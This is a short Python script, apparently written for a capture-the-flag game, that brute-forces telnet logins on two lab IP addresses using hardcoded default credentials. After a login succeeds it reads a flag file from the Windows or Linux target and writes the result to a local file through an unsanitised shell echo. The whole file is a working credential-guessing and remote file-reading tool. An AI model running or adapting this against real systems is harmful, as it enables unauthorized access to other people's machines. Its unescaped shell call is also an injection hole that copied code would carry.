import telnetlib
from os import system
import threading
import time

windows_flag_path="C:\\flag.txt"
linux_flag_path="/flag.txt"


def con_telnet(host,username,password):
        tl=telnetlib.Telnet(host=host,port=23)
        tl.read_until(":".encode())
        tl.write((username+"\r\n").encode())
        tl.read_until(":".encode())
        tl.write((password+"\r\n").encode())
        t=tl.read_until(username.encode(),timeout=5)
        if  t.find(b"incorrect") != -1:
            pass
        else:
            if (int(str(t).find("["+username))==-1):
                tl.write(("type "+windows_flag_path+"\r\n").encode())
            else:
                tl.write(("cat "+linux_flag_path+"\r\n").encode())
            tl.write("exit\r\n".encode())
            print("try cat "+host+" flag.txt,write the value into "+host+".txt")
            system("echo \"" + tl.read_until("closed".encode()).decode().replace("\r","") + "\" > "+host+".txt")

if __name__ == "__main__":
    host_list=["192.168.158.144","192.168.158.136"]
    username_list=["Administrator","root"]
    password_list=["qwe`123","toor"]
    for ip in host_list:
        for username in username_list:
            for password in password_list:
                #con_telnet(ip,username,password)
                t=threading.Thread(target=con_telnet,args=(ip,username,password))
                t.start()
                time.sleep(1)
